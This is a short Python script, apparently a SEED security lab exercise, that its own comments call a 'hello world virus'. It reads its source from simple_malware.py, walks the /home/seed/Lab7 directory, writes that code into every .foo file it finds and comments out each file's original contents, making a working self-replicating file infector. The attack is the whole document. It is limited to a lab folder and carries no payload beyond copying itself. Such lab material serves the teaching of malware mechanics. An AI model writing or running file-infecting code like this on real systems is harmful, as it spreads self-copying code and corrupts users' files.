#!/usr/bin/python3 -u

import sys,os,re
import glob
import fileinput,subprocess,inspect

## hello world virus
## hellovirus

os.chdir("/home/seed/Lab7")

try:
   #IN=open(f" {__file__}",'r')
   with open('simple_malware.py', 'r') as virusFile:
   	virusData = virusFile.read()
   	print(virusData)
except OSError:
	print("Failed to copy virus data")
	sys.exit()
   
for root, dirs, files in os.walk("/home/seed/Lab7"):
	for file in files:
		if file.endswith(".foo"):
			filepath = os.path.join(root, file)
			with open(filepath, 'r', encoding='utf-8') as f:
				text = f.read()
				text2 = text
				print('%s read' % filepath)
			with open(filepath, 'w', encoding='utf-8') as f:
				f.write(text.replace(text, virusData))
				f.write("\n #")
				f.write(text2)
				print('%s updated' % filepath)
	
#text = all_of_it			
